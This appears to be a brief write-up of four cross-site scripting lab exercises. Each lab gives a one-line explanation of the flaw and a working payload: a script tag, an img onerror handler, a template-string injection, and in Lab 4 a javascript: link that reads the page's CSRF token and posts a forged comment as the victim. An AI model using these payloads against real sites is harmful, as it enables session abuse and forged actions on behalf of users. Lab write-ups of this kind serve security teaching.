# Lab 1
Any place where arbitrary HTML can be inserted is a place where arbitrary JS can be placed. This is the classic XSS attack.
```html
<script>alert(1)</script>
```

# Lab 2
`document.innerHTML` will block `<script>` tags on all browsers, but there are many workarounds.  
This exploit uses an `<img>` that has an invalid source and executes arbitrary code in the `onerror` event handler.
```html
<img src=1 onerror=alert(1) />
```

# Lab 3
The exploit takes advantage of a reflection inside JavaScript template strings.
```js
${alert(1)}
```

# Lab 4
The vulnerability is in the website parameter. The exploit requires that the victim clicks the website stored by the attacker.
```js
javascript:var _csrf=document.getElementsByName('_csrf')[0].value;alert(_csrf);fetch('/lab4',{method:'POST',body:new URLSearchParams({_csrf,authorName:'Victim',authorWebsite:'http://pwned.com',message:'I have been pwned'})})
```